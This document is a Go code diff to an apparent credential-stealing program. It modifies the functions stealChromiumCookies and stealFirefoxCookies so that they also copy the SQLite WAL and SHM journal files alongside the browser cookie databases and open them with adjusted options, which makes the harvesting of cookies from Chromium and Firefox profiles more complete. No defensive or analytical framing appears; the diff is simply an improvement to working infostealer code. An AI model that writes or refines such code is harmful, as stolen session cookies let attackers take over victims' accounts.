@@ -77,9 +77,13 @@ func stealChromiumCookies(userDataPath string, browserName string) string {
 
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_cookies_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
 		copyFileSimple(cookiePath, tmpPath)
+		copyFileSimple(cookiePath+"-wal", tmpPath+"-wal")
+		copyFileSimple(cookiePath+"-shm", tmpPath+"-shm")
 		defer os.Remove(tmpPath)
+		defer os.Remove(tmpPath + "-wal")
+		defer os.Remove(tmpPath + "-shm")
 
-		db, err := sql.Open("sqlite3", tmpPath+"?mode=ro&_journal_mode=WAL")
+		db, err := sql.Open("sqlite3", tmpPath+"?mode=ro&_journal=WAL&_busy_timeout=3000")
 		if err != nil {
 			continue
 		}
@@ -129,9 +133,13 @@ func stealFirefoxCookies(profilesPath string) string {
 
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ff_cookies_%s_%d", e.Name(), time.Now().UnixNano()))
 		copyFileSimple(cookiePath, tmpPath)
+		copyFileSimple(cookiePath+"-wal", tmpPath+"-wal")
+		copyFileSimple(cookiePath+"-shm", tmpPath+"-shm")
 		defer os.Remove(tmpPath)
+		defer os.Remove(tmpPath + "-wal")
+		defer os.Remove(tmpPath + "-shm")
 
-		db, err := sql.Open("sqlite3", tmpPath+"?mode=ro")
+		db, err := sql.Open("sqlite3", tmpPath+"?mode=ro&_busy_timeout=3000")
 		if err != nil {
 			continue
 		}
